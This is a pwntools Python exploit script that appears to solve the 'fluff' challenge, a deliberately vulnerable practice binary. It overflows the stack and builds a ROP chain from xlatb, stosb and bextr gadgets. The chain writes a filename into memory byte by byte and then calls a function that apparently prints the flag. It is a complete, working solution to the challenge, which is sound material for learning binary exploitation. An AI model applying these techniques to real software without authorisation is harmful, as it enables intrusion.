#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fluff
from pwn import *
import sys

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fluff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
break *0x40062a
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

def useLetter(letterAddress, rdx = 0):
    xlatb = p64(0x400628)       # al = *(ds:bx + zextend(al))
    stosb = p64(0x400639)       # increments rdi for byte operation.  Store byte
                                #   from al to memory location at ES:EDI
    bextrRdx = p64(0x40062a)    # Roundabout way to write a byte to rbx
    bextr = p64(0x40062b)       # No pop rdx

    if (rdx):
        chain = bextrRdx + p64(rdx) + p64(letterAddress - 0x3ef2) + xlatb + stosb
    else:
        chain = bextr +  p64(letterAddress - 0x3ef2) + xlatb + stosb

    return chain

def setupRdi():
    popRdi = p64(0x4006a3)
    dataAddress = p64(0x601028)

    return popRdi + dataAddress


io = start()

junk = b'A'*32 + b'B'*8


payload = junk + setupRdi() + useLetter(0x4003d7, 0xff00) + useLetter(0x40037e) + useLetter(0x40036a) + useLetter(0x40036e) + useLetter(0x4003cd) + useLetter(0x40069d) + useLetter(0x400654) + useLetter(0x400653) + setupRdi() + p64(0x400620)

log.info(io.clean())
io.sendline(payload)
log.info(io.clean())

io.interactive()

